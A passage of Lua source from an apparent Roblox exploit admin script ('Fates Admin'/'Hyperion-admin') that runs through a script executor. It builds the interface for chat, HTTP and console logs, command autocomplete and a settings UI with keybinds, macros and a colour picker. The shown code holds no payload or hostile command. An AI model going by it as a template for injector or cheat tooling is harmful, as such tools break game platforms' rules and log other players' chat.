Utils.Click(ChatLogs.Close, "TextColor3")

Utils.Click(Console.Clear, "BackgroundColor3");
Utils.Click(Console.Save, "BackgroundColor3");
Utils.Click(Console.Close, "TextColor3");

Utils.Click(GlobalChatLogs.Clear, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Save, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Toggle, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Close, "TextColor3")

Utils.Click(HttpLogs.Clear, "BackgroundColor3")
Utils.Click(HttpLogs.Save, "BackgroundColor3")
Utils.Click(HttpLogs.Toggle, "BackgroundColor3")
Utils.Click(HttpLogs.Close, "TextColor3")

AddConnection(CConnect(Commands.Close.MouseButton1Click, function()
	local Tween = Utils.TweenAllTrans(Commands, .25)

	CWait(Tween.Completed);
	Commands.Visible = false
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(Commands.Search, "Text"), function()
	local Text = Commands.Search.Text
	local Children = GetChildren(Commands.Frame.List);
	for i = 1, #Children do
		local v = Children[i]
		if (IsA(v, "Frame")) then
			local Command = v.CommandText.Text
			v.Visible = Sfind(lower(Command), Text, 1, true)
		end
	end
	Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y)
end), Connections.UI, true);

AddConnection(CConnect(ChatLogs.Close.MouseButton1Click, function()
	local Tween = Utils.TweenAllTrans(ChatLogs, .25)

	CWait(Tween.Completed);
	ChatLogs.Visible = false
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Close.MouseButton1Click, function()
	local Tween = Utils.TweenAllTrans(GlobalChatLogs, .25)

	CWait(Tween.Completed);
	GlobalChatLogs.Visible = false
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Close.MouseButton1Click, function()
	local Tween = Utils.TweenAllTrans(HttpLogs, .25)

	CWait(Tween.Completed);
	HttpLogs.Visible = false
end), Connections.UI, true);

AddConnection(CConnect(Console.Close.MouseButton1Click, function()
	local Tween = Utils.TweenAllTrans(Console, .25)

	CWait(Tween.Completed);
	Console.Visible = false
end), Connections.UI, true);

ChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
GlobalChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
HttpLogs.Toggle.Text = _L.HttpLogsEnabled and "Enabled" or "Disabled"

AddConnection(CConnect(ChatLogs.Toggle.MouseButton1Click, function()
	_L.ChatLogsEnabled = not _L.ChatLogsEnabled
	ChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Toggle.MouseButton1Click, function()
	_L.GlobalChatLogsEnabled = not _L.GlobalChatLogsEnabled
	GlobalChatLogs.Toggle.Text = _L.GlobalChatLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Toggle.MouseButton1Click, function()
	_L.HttpLogsEnabled = not _L.HttpLogsEnabled
	HttpLogs.Toggle.Text = _L.HttpLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);

AddConnection(CConnect(ChatLogs.Clear.MouseButton1Click, function()
	Utils.ClearAllObjects(ChatLogs.Frame.List)
	ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Clear.MouseButton1Click, function()
	Utils.ClearAllObjects(GlobalChatLogs.Frame.List)
	GlobalChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Clear.MouseButton1Click, function()
	Utils.ClearAllObjects(HttpLogs.Frame.List)
	HttpLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);

AddConnection(CConnect(Console.Clear.MouseButton1Click, function()
	Utils.ClearAllObjects(Console.Frame.List);
	Console.Frame.List.CanvasSize = UDim2.fromOffset(0, 0);
end), Connections.UI, true);

do
	local ShowWarns, ShowErrors, ShowOutput = true, true, true
	AddConnection(CConnect(Console.Warns.MouseButton1Click, function()
		ShowWarns = not ShowWarns
		local Children = GetChildren(Console.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "W") then
				v.Visible = ShowWarns
			end
		end
		Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		Console.Warns.Text = ShowWarns and "Hide Warns" or "Show Warns"
	end), Connections.UI, true);
	AddConnection(CConnect(Console.Errors.MouseButton1Click, function()
		ShowErrors = not ShowErrors
		local Children = GetChildren(Console.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "E") then
				v.Visible = ShowErrors
			end
		end
		Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		Console.Errors.Text = ShowErrors and "Hide Errors" or "Show Errors"
	end), Connections.UI, true);
	AddConnection(CConnect(Console.Output.MouseButton1Click, function()
		ShowOutput = not ShowOutput
		local Children = GetChildren(Console.Frame.List);
		for i = 1, #Children do
			local v = Children[i]
			if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "P") then
				v.Visible = ShowOutput
			end
		end
		Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		Console.Output.Text = ShowOutput and "Hide Output" or "Show Output"
	end), Connections.UI, true);
end

AddConnection(CConnect(GetPropertyChangedSignal(ChatLogs.Search, "Text"), function()
	local Text = ChatLogs.Search.Text
	local Children = GetChildren(ChatLogs.Frame.List);
	for i = 1, #Children do
		local v = Children[i]
		if (not IsA(v, "UIListLayout")) then
			local Message = v.Text
			v.Visible = Sfind(lower(Message), Text, 1, true);
		end
	end
	ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(GlobalChatLogs.Search, "Text"), function()
	local Text = GlobalChatLogs.Search.Text

	local Children = GetChildren(GlobalChatLogs.Frame.List);
	for i = 1, #Children do
		local v = Children[i]
		if (not IsA(v, "UIListLayout")) then
			local Message = v.Text

			v.Visible = Sfind(lower(Message), Text, 1, true)
		end
	end
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(HttpLogs.Search, "Text"), function()
	local Text = HttpLogs.Search.Text

	local Children = GetChildren(HttpLogs.Frame.List);
	for i = 1, #Children do
		local v = Children[i]
		if (not IsA(v, "UIListLayout")) then
			local Message = v.Text
			v.Visible = Sfind(lower(Message), Text, 1, true)
		end
	end
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(Console.Search, "Text"), function()
	local Text = Console.Search.Text
	local Children = GetChildren(Console.Frame.List);
	for i = 1, #Children do
		local v = Children[i]
		if (not IsA(v, "UIListLayout")) then
			local Message = v.Text
			v.Visible = Sfind(lower(Message), Text, 1, true)
		end
	end
	Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y)
end), Connections.UI, true);


AddConnection(CConnect(ChatLogs.Save.MouseButton1Click, function()
	local GameName = Services.MarketplaceService.GetProductInfo(Services.MarketplaceService, game.PlaceId).Name
	local String =  format("Fates Admin Chatlogs for %s (%s)\n\n", GameName, os.date());
	local TimeSaved = gsub(tostring(os.date("%x")), "/", "-") .. " " .. gsub(tostring(os.date("%X")), ":", "-");
	local Name = format("Hyperion-admin/chatlogs/%s (%s).txt", GameName, TimeSaved);
	local Children = GetChildren(ChatLogs.Frame.List);
	for i = 1, #Children do
		local v = Children[i]
		if (not IsA(v, "UIListLayout")) then
			String = format("%s%s\n", String, v.Text);
		end
	end
	writefile(Name, String);
	Utils.Notify(LocalPlayer, "Saved", "Chat logs saved!");
end), Connections.UI, true);

AddConnection(CConnect(HttpLogs.Save.MouseButton1Click, function()
	local Children = GetChildren(HttpLogs.Frame.List);
	local Logs =  format("Fates Admin HttpLogs for %s\n\n", os.date());
	for i = 1, #Children do
		local v = Children[i]
		if (not IsA(v, "UIListLayout")) then
			Logs = format("%s%s\n", Logs, v.Text);
		end
	end
	if (not isfolder("Hyperion-admin/httplogs")) then
		makefolder("Hyperion-admin/httplogs");
	end
	writefile(format("Hyperion-admin/httplogs/HttpLogs for %s", gsub(tostring(os.date("%X")), ":", "-")) .. ".txt", gsub(Logs, "%b<>", ""));
	Utils.Notify(LocalPlayer, "Saved", "Http logs saved!");
end), Connections.UI, true);

AddConnection(CConnect(Console.Save.MouseButton1Click, function()
	local GameName = Services.MarketplaceService.GetProductInfo(Services.MarketplaceService, game.PlaceId).Name
	local TimeSaved = gsub(tostring(os.date("%x")), "/", "-") .. " " .. gsub(tostring(os.date("%X")), ":", "-");
	local Children = GetChildren(Console.Frame.List);
	local String =  format("Fates Admin logs %s\nGame: %s - %d\n\n", TimeSaved, GameName, game.PlaceId);
	local Names = { ["P"] = "OUTPUT", ["W"] = "WARNING", ["E"] = "ERROR" }
	for i = 1, #Children do
		local v = Children[i]
		if (not IsA(v, "UIListLayout")) then
			String = format("%s[%s] %s\n", String, Names[sub(v.Name, 1, 1)] or "", v.Text);
		end
	end
	writefile("Hyperion-admin/logs.txt", String);
	Utils.Notify(LocalPlayer, "Saved", "Console Logs saved!");
end), Connections.UI, true);

-- auto correct
AddConnection(CConnect(GetPropertyChangedSignal(CommandBar.Input, "Text"), function() -- make it so that every space a players name will appear
	CommandBar.Input.Text = CommandBar.Input.Text
	local Text = CommandBar.Input.Text
	local Prediction = CommandBar.Input.Predict
	local PredictionText = Prediction.Text

	local Args = split(Text, " ")

	Prediction.Text = ""
	if (Text == "") then
		return
	end

	local FoundCommand = false
	local FoundAlias = false
	CommandArgs = CommandArgs or {}
	if (not CommandsTable[Args[1]]) then
		for _, v in next, CommandsTable do
			local CommandName = v.Name
			local Aliases = v.Aliases
			local FoundAlias

			if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
				Prediction.Text = CommandName
				CommandArgs = v.Args or {}
				break
			end

			for _, v2 in next, Aliases do
				if (Utils.MatchSearch(Args[1], v2)) then
					FoundAlias = true
					Prediction.Text = v2
					CommandArgs = v2.Args or {}
					break
				end

				if (FoundAlias) then
					break
				end
			end
		end
	end

	for i, v in next, Args do -- make it get more players after i space out
		if (i > 1 and v ~= "") then
			local Predict = ""
			if (#CommandArgs >= 1) then
				for i2, v2 in next, CommandArgs do
					if (lower(v2) == "player") then
						Predict = Utils.GetPlayerArgs(v) or Predict;
					else
						Predict = Utils.MatchSearch(v, v2) and v2 or Predict
					end
				end
			else
				Predict = Utils.GetPlayerArgs(v) or Predict;
			end
			Prediction.Text = sub(Text, 1, #Text - #Args[#Args]) .. Predict
			local split = split(v, ",");
			if (next(split)) then
				for i2, v2 in next, split do
					if (i2 > 1 and v2 ~= "") then
						local PlayerName = Utils.GetPlayerArgs(v2)
						Prediction.Text = sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
					end
				end
			end
		end
	end

	if (Sfind(Text, "\t")) then -- remove tab from preditction text also
		CommandBar.Input.Text = PredictionText
		CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 1
	end
end))


do
	local Enabled = false
	local Connection;
	local Predict;
	ToggleChatPrediction = function()
		if (_L.Frame2) then
			return
		end
		if (not Enabled) then
			local RobloxChat = LocalPlayer.PlayerGui and FindFirstChild(LocalPlayer.PlayerGui, "Chat");
			local RobloxChatBarFrame;
			if (RobloxChat) then
				local RobloxChatFrame = FindFirstChild(RobloxChat, "Frame");
				if (RobloxChatFrame) then
					RobloxChatBarFrame = FindFirstChild(RobloxChatFrame, "ChatBarParentFrame");
				end
			end
			local PredictionClone, ChatBar
			if (RobloxChatBarFrame) then
				local Frame1 = FindFirstChild(RobloxChatBarFrame, 'Frame');
				if Frame1 then
					local BoxFrame = FindFirstChild(Frame1, 'BoxFrame');
					if BoxFrame then
						_L.Frame2 = FindFirstChild(BoxFrame, 'Frame');
						if _L.Frame2 then
							local TextLabel = FindFirstChild(_L.Frame2, 'TextLabel');
							ChatBar = FindFirstChild(_L.Frame2, 'ChatBar');
							if TextLabel and ChatBar then
								PredictionClone = InstanceNew('TextLabel');
								PredictionClone.Font = TextLabel.Font
								PredictionClone.LineHeight = TextLabel.LineHeight
								PredictionClone.MaxVisibleGraphemes = TextLabel.MaxVisibleGraphemes
								PredictionClone.RichText = TextLabel.RichText
								PredictionClone.Text = ''
								PredictionClone.TextColor3 = TextLabel.TextColor3
								PredictionClone.TextScaled = TextLabel.TextScaled
								PredictionClone.TextSize = TextLabel.TextSize
								PredictionClone.TextStrokeColor3 = TextLabel.TextStrokeColor3
								PredictionClone.TextStrokeTransparency = TextLabel.TextStrokeTransparency
								PredictionClone.TextTransparency = 0.3
								PredictionClone.TextTruncate = TextLabel.TextTruncate
								PredictionClone.TextWrapped = TextLabel.TextWrapped
								PredictionClone.TextXAlignment = TextLabel.TextXAlignment
								PredictionClone.TextYAlignment = TextLabel.TextYAlignment
								PredictionClone.Name = "Predict"
								PredictionClone.Size = UDim2.new(1, 0, 1, 0);
								PredictionClone.BackgroundTransparency = 1
							end
						end
					end
				end
			end

			ParentGui(PredictionClone, _L.Frame2);
			Predict = PredictionClone

			Connection = AddConnection(CConnect(GetPropertyChangedSignal(ChatBar, "Text"), function() -- todo: add detection for /e
				local Text = ChatBar.Text
				local Prediction = PredictionClone
				local PredictionText = PredictionClone.Text

				local Args = split(concat(shift(split(Text, ""))), " ");

				Prediction.Text = ""
				if (not startsWith(Text, Prefix)) then
					return
				end

				local FoundCommand = false
				local FoundAlias = false
				CommandArgs = CommandArgs or {}
				if (not rawget(CommandsTable, Args[1])) then
					for _, v in next, CommandsTable do
						local CommandName = v.Name
						local Aliases = v.Aliases
						local FoundAlias

						if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
							Prediction.Text = Prefix .. CommandName
							FoundCommand = true
							CommandArgs = v.Args or {}
							break
						end

						for _, v2 in next, Aliases do
							if (Utils.MatchSearch(Args[1], v2)) then
								FoundAlias = true
								Prediction.Text = v2
								CommandArgs = v.Args or {}
								break
							end

							if (FoundAlias) then
								break
							end
						end
					end
				end

				for i, v in next, Args do -- make it get more players after i space out
					if (i > 1 and v ~= "") then
						local Predict = ""
						if (#CommandArgs >= 1) then
							for i2, v2 in next, CommandArgs do
								if (lower(v2) == "player") then
									Predict = Utils.GetPlayerArgs(v) or Predict;
								else
									Predict = Utils.MatchSearch(v, v2) and v2 or Predict
								end
							end
						else
							Predict = Utils.GetPlayerArgs(v) or Predict;
						end
						Prediction.Text = sub(Text, 1, #Text - #Args[#Args]) .. Predict
						local split = split(v, ",");
						if (next(split)) then
							for i2, v2 in next, split do
								if (i2 > 1 and v2 ~= "") then
									local PlayerName = Utils.GetPlayerArgs(v2)
									Prediction.Text = sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
								end
							end
						end
					end
				end

				if (Sfind(Text, "\t")) then -- remove tab from preditction text also
					ChatBar.Text = PredictionText
					ChatBar.CursorPosition = #ChatBar.Text + 2
				end
			end))
			Enabled = true
			return ChatBar
		else
			Disconnect(Connection);
			Destroy(Predict);
			Enabled = false
		end
		return _L.Frame2
	end

	if (CurrentConfig.ChatPrediction) then
		delay(2, ToggleChatPrediction);
	end
end

local ConfigUILib = {}
do
	local GuiObjects = ConfigElements
	local PageCount = 0
	local SelectedPage
	local UserInputService = Services.UserInputService

	local Colors = {
		ToggleEnabled = Color3.fromRGB(5, 5, 6);
		Background = Color3.fromRGB(32, 33, 36);
		ToggleDisabled = Color3.fromRGB(27, 28, 31);
	}

	local ColorElements = ConfigElements.Elements.ColorElements
	local Overlay = ColorElements.Overlay
	local OverlayMain = Overlay.Main
	local ColorPicker = OverlayMain.ColorPicker
	local Settings = OverlayMain.Settings
	local ClosePicker = OverlayMain.Close
	local ColorCanvas = ColorPicker.ColorCanvas
	local ColorSlider = ColorPicker.ColorSlider
	local ColorGradient = ColorCanvas.ColorGradient
	local DarkGradient = ColorGradient.DarkGradient
	local CanvasBar = ColorGradient.Bar
	local RainbowGradient = ColorSlider.RainbowGradient
	local SliderBar = RainbowGradient.Bar
	local CanvasHitbox = ColorCanvas.Hitbox
	local SliderHitbox = ColorSlider.Hitbox
	local ColorPreview = Settings.ColorPreview
	local ColorOptions = Settings.Options
	local RedTextBox = ColorOptions.Red.TextBox
	local BlueTextBox = ColorOptions.Blue.TextBox
	local GreenTextBox = ColorOptions.Green.TextBox
	local RainbowToggle = ColorOptions.Rainbow

	local function UpdateClone()
		ConfigUIClone = Clone(ConfigUI);
	end

	function ConfigUILib.NewPage(Title)
		local Page = Clone(GuiObjects.Page.Container);
		local TextButton = Clone(GuiObjects.Page.TextButton);

		Page.Visible = true
		TextButton.Visible = true

		Utils.Click(TextButton, "BackgroundColor3")

		if PageCount == 0 then
			SelectedPage = Page
		end

		AddConnection(CConnect(TextButton.MouseButton1Click, function()
			if SelectedPage.Name ~= TextButton.Name then          
				SelectedPage = Page
				ConfigUI.Container.UIPageLayout:JumpTo(SelectedPage)
			end
		end))

		Page.Name = Title
		TextButton.Name = Title
		TextButton.Text = Title

		Page.Parent = ConfigUI.Container
		TextButton.Parent = ConfigUI.Selection

		PageCount = PageCount + 1


		UpdateClone()

		local function GetKeyName(KeyCode)
			local _, Stringed = pcall(UserInputService.GetStringForKeyCode, UserInputService, KeyCode);
			local IsEnum = Stringed == ""
			return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
		end

		local PageLibrary = {}

		function PageLibrary.CreateMacroSection(MacrosToAdd, Callback)
			local Macro = Clone(GuiObjects.Elements.Macro);
			local MacroPage = Macro.MacroPage
			local Selection = Page.Selection

			Selection.ClearAllChildren(Selection);
			for i,v in next, GetChildren(MacroPage) do
				v.Parent = Selection
			end
			Selection.Container.Visible = true
			local CommandsList = Selection.Container.Commands.Frame.List
			local CurrentMacros = Selection.Container.CurrentMacros
			local AddMacro = Selection.AddMacro
			local BindA, CommandA, ArgsA = AddMacro.Bind, AddMacro.Command, AddMacro["z Args"]
			local Add = AddMacro.AddMacro
			local Keybind = {};
			local Enabled = false
			local Connection

			local OnClick = function()
				Enabled = not Enabled
				if Enabled then
					BindA.Text = "..."
					local OldShiftLock = LocalPlayer.DevEnableMouseLock
					LocalPlayer.DevEnableMouseLock = false
					Keybind = {}
					Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
						if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
							local Input2, Proccessed2;
							CThread(function()
								Input2, Proccessed2 = CWait(UserInputService.InputBegan);
							end)()
							CWait(UserInputService.InputEnded);
							if (Input2 and not Processed) then
								local KeyName, IsEnum = GetKeyName(Input.KeyCode);
								local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
								BindA.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
								Keybind[1] = Input.KeyCode
								Keybind[2] = Input2.KeyCode
							else
								local KeyName = GetKeyName(Input.KeyCode);
								BindA.Text = KeyName
								Keybind[1] = Input.KeyCode
								Keybind[2] = nil
							end
							LocalPlayer.DevEnableMouseLock = OldShiftLock
						else
							BindA.Text = "Bind"
						end
						Enabled = false
						Disconnect(Connection);
					end));
				else
					BindA.Text = "Bind"
					Disconnect(Connection);
				end
			end

			AddConnection(CConnect(BindA.MouseButton1Click, OnClick));
			AddConnection(CConnect(Add.MouseButton1Click, function()
				if (BindA.Text == "Bind") then
					Utils.Notify(nil, nil, "You must assign a keybind");
					return
				end
				if (not CommandsTable[CommandA.Text]) then
					Utils.Notify(nil, nil, "You must add a command");
					return
				end
				Callback(Keybind, CommandA.Text, ArgsA.Text);
			end));

			local Focused = false
			local MacroSection = {
				CommandsList = CommandsList,
				AddCmd = function(Name) 
					local Command = Clone(Macro.Command);
					Command.Name = Name
					Command.Text = Name
					Command.Parent = CommandsList
					Command.Visible = true
					AddConnection(CConnect(Command.MouseButton1Click, function()
						CommandA.Text = Name
						ArgsA.CaptureFocus(ArgsA);
						Focused = true
						CWait(ArgsA.FocusLost);
						CWait(UserInputService.InputBegan);
						Focused = false
						wait(.2);
						if (not Focused) then
							OnClick();
						end
					end))
				end,
				AddMacro = function(MacroName, Bind)
					local NewMacro = Clone(Macro.EditMacro);
					NewMacro.Bind.Text = Bind
					NewMacro.Macro.Text = MacroName
					NewMacro.Parent = CurrentMacros
					NewMacro.Visible = true

					Utils.Thing(NewMacro.Bind);
					Utils.Thing(NewMacro.Macro);

					FindFirstChild(NewMacro, "Remove").Name = "Delete"
					AddConnection(CConnect(NewMacro.Delete.MouseButton1Click, function()
						CWait(Utils.TweenAllTrans(NewMacro, .25).Completed);
						Destroy(NewMacro);
						for i = 1, #Macros do
							if (Macros[i].Command == split(MacroName, " ")[1]) then
								Macros[i] = nil
							end
						end
						local TempMacros = clone(Macros);
						for i, v in next, TempMacros do
							for i2, v2 in next, v.Keys do
								TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
							end
						end
						SetConfig({Macros=TempMacros});
					end))
				end
			}

			for i, v in next, MacrosToAdd do
				local Suc, Err = pcall(concat, v.Args, " ");
				if (not Suc) then
					SetConfig({Macros={}});
					Utils.Notify(LocalPlayer, "Error", "Macros were reset due to corrupted data")
					break;
				end
				local KeyName, IsEnum = GetKeyName(v.Keys[1]);
				local Formatted;
				if (v.Keys[2]) then
					local KeyName2, IsEnum2 = GetKeyName(v.Keys[2]); 
					Formatted = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
				else
					Formatted = KeyName
				end
				MacroSection.AddMacro(v.Command .. " " .. concat(v.Args, " "), Formatted);
			end

			return MacroSection
		end

		function PageLibrary.NewSection(Title)
			local Section = Clone(GuiObjects.Section.Container);
			local SectionOptions = Section.Options
			local SectionUIListLayout = SectionOptions.UIListLayout

			Section.Visible = true

			Utils.SmoothScroll(Section.Options, .14)
			Section.Title.Text = Title
			Section.Parent = Page.Selection


			SectionOptions.CanvasSize = UDim2.fromOffset(0,0) --// change
			AddConnection(CConnect(GetPropertyChangedSignal(SectionUIListLayout, "AbsoluteContentSize"), function()
				SectionOptions.CanvasSize = UDim2.fromOffset(0, SectionUIListLayout.AbsoluteContentSize.Y + 5);
			end));

			UpdateClone();

			local ElementLibrary = {}


			function ElementLibrary.Toggle(Title, Enabled, Callback)
				local Toggle = Clone(GuiObjects.Elements.Toggle);
				local Container = Toggle.Container

				local Switch = Container.Switch
				local Hitbox = Container.Hitbox

				if not Enabled then
					Switch.Position = UDim2.fromOffset(2, 2)
					Container.BackgroundColor3 = Colors.ToggleDisabled
				end
				local NoCallback = false

				local OnClick = function()
					Enabled = not Enabled

					Utils.Tween(Switch, "Quad", "Out", .25, {
						Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
					})
					Utils.Tween(Container, "Quad", "Out", .25, {
						BackgroundColor3 = Enabled and Colors.ToggleEnabled or Colors.ToggleDisabled
					})

					if (not NoCallback) then
						Callback(Enabled);
					end
				end

				AddConnection(CConnect(Hitbox.MouseButton1Click, OnClick));

				Toggle.Visible = true
				Toggle.Title.Text = Title
				Toggle.Parent = Section.Options
				Utils.Thing(Toggle.Title);

				UpdateClone()

				return function()
					NoCallback = true
					OnClick();
					NoCallback = false
				end
			end

			function ElementLibrary.ScrollingFrame(Title, Callback, Elements, Toggles)
				local ScrollingFrame = Clone(GuiObjects.Elements.ScrollingFrame);
				local Frame = ScrollingFrame.Frame
				local Toggle = ScrollingFrame.Toggle

				for ElementTitle, Enabled in next, Elements do
					local NewToggle = Clone(Toggle);
					NewToggle.Visible = true
					NewToggle.Title.Text = ElementTitle
					NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");


					Utils.Click(NewToggle.Plugins, "BackgroundColor3")

					AddConnection(CConnect(NewToggle.Plugins.MouseButton1Click, function()
						Enabled = not Enabled
						NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");

						Callback(ElementTitle, Enabled);
					end));

					NewToggle.Parent = Frame.Container
				end

				Frame.Visible = true
				Frame.Title.Text = Title
				Frame.Parent = Section.Options

				for _, NewToggle in next, GetChildren(Frame.Container) do
					if (IsA(NewToggle, "GuiObject")) then
						Utils.Thing(NewToggle.Title);
					end
				end

				UpdateClone()
			end

			function ElementLibrary.Keybind(Title, Bind, Callback)
				local Keybind = Clone(GuiObjects.Elements.Keybind);
				local Enabled = false
				local Connection

				Keybind.Container.Text = Bind
				Keybind.Title.Text = Title

				local Container = Keybind.Container
				AddConnection(CConnect(Container.MouseButton1Click, function()
					Enabled = not Enabled

					if Enabled then
						Container.Text = "..."
						local OldShiftLock = LocalPlayer.DevEnableMouseLock
						-- disable shift lock so it doesn't interfere with keybind
						LocalPlayer.DevEnableMouseLock = false
						Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
							if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
								local Input2, Proccessed2;
								CThread(function()
									Input2, Proccessed2 = CWait(UserInputService.InputBegan);
								end)()
								CWait(UserInputService.InputEnded);
								if (Input2 and not Processed) then
									local KeyName, IsEnum = GetKeyName(Input.KeyCode);
									local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
									-- Order by if it's an enum first, example 'Shift + K' and not 'K + Shift'
									Container.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
									Callback(Input.KeyCode, Input2.KeyCode);
								else
									local KeyName = GetKeyName(Input.KeyCode);
									Container.Text = KeyName
									Callback(Input.KeyCode);
								end
								LocalPlayer.DevEnableMouseLock = OldShiftLock
							else
								Container.Text = "press"
							end
							Enabled = false
							Disconnect(Connection);
						end));
					else
						Container.Text = "press"
						Disconnect(Connection);
					end
				end));

				Utils.Click(Container, "BackgroundColor3");
				Keybind.Visible = true
				Keybind.Parent = Section.Options
				UpdateClone();
			end

			function ElementLibrary.TextboxKeybind(Title, Bind, Callback)
				local Keybind = Clone(GuiObjects.Elements.TextboxKeybind);

				Keybind.Container.Text = Bind
				Keybind.Title.Text = Title

				local Container = Keybind.Container
				AddConnection(CConnect(GetPropertyChangedSignal(Container, "Text"), function(Key)
					if (#Container.Text >= 1) then
						Container.Text = sub(Container.Text, 1, 1);
						Callback(Container.Text);
						Container.ReleaseFocus(Container);
					end
				end))

				Keybind.Visible = true
				Keybind.Parent = Section.Options
				UpdateClone();
			end

			function ElementLibrary.ColorPicker(Title, DefaultColor, Callback)
				local SelectColor = Clone(ColorElements.SelectColor);
				local CurrentColor = DefaultColor
				local Button = SelectColor.Button
				local ToHSV = DefaultColor.ToHSV
				local Color3New = Color3.new
				local Color3fromHSV = Color3.fromHSV
				local UDim2New = UDim2.new
				local clamp = math.clamp

				local H, S, V = ToHSV(DefaultColor);
				local Opened = false
				local Rainbow = false

				local function UpdateText()
					RedTextBox.PlaceholderText = tostring(math.floor(CurrentColor.R * 255))
					GreenTextBox.PlaceholderText = tostring(math.floor(CurrentColor.G * 255))
					BlueTextBox.PlaceholderText = tostring(math.floor(CurrentColor.B * 255))
				end

				local function UpdateColor()
					H, S, V = ToHSV(CurrentColor);

					SliderBar.Position = UDim2New(0, 0, H, 2);
					CanvasBar.Position = UDim2New(S, 2, 1 - V, 2);
					ColorGradient.UIGradient.Color = Utils.MakeGradient({
						[1] = Color3New(1, 1, 1);
						[2] = Color3fromHSV(H, 1, 1);
					})

					ColorPreview.BackgroundColor3 = CurrentColor
					UpdateText();
				end

				local function UpdateHue(Hue)
					SliderBar.Position = UDim2New(0, 0, Hue, 2);
					ColorGradient.UIGradient.Color = Utils.MakeGradient({
						[1] = Color3New(1, 1, 1);
						[2] = Color3fromHSV(Hue, 1, 1);
					});

					ColorPreview.BackgroundColor3 = CurrentColor
					UpdateText();
				end

				local function ColorSliderInit()
					local Moving = false

					local function Update()
						if Opened and not Rainbow then
							local LowerBound = SliderHitbox.AbsoluteSize.Y
							local Position = clamp(Mouse.Y - SliderHitbox.AbsolutePosition.Y, 0, LowerBound);
							local Value = Position / LowerBound

							H = Value
							CurrentColor = Color3fromHSV(H, S, V);
							ColorPreview.BackgroundColor3 = CurrentColor
							ColorGradient.UIGradient.Color = Utils.MakeGradient({
								[1] = Color3New(1, 1, 1);
								[2] = Color3fromHSV(H, 1, 1);
							});

							UpdateText();

							local Position = UDim2.new(0, 0, Value, 2)
							local Tween = Utils.Tween(SliderBar, "Linear", "Out", .05, {
								Position = Position
							});

							Callback(CurrentColor);
							CWait(Tween.Completed);
						end
					end

					AddConnection(CConnect(SliderHitbox.MouseButton1Down, function()
						Moving = true
						Update()
					end))

					AddConnection(CConnect(UserInputService.InputEnded, function(Input)
						if Input.UserInputType == Enum.UserInputType.MouseButton1 and Moving then
							Moving = false
						end
					end))

					AddConnection(CConnect(Mouse.Move, Utils.Debounce(function()
						if Moving then
							Update()
						end
					end)))
				end
				local function ColorCanvasInit()
					local Moving = false

					local function Update()
						if Opened then
							local LowerBound = CanvasHitbox.AbsoluteSize.Y
							local YPosition = clamp(Mouse.Y - CanvasHitbox.AbsolutePosition.Y, 0, LowerBound)
							local YValue = YPosition / LowerBound
							local RightBound = CanvasHitbox.AbsoluteSize.X
							local XPosition = clamp(Mouse.X - CanvasHitbox.AbsolutePosition.X, 0, RightBound)
							local XValue = XPosition / RightBound

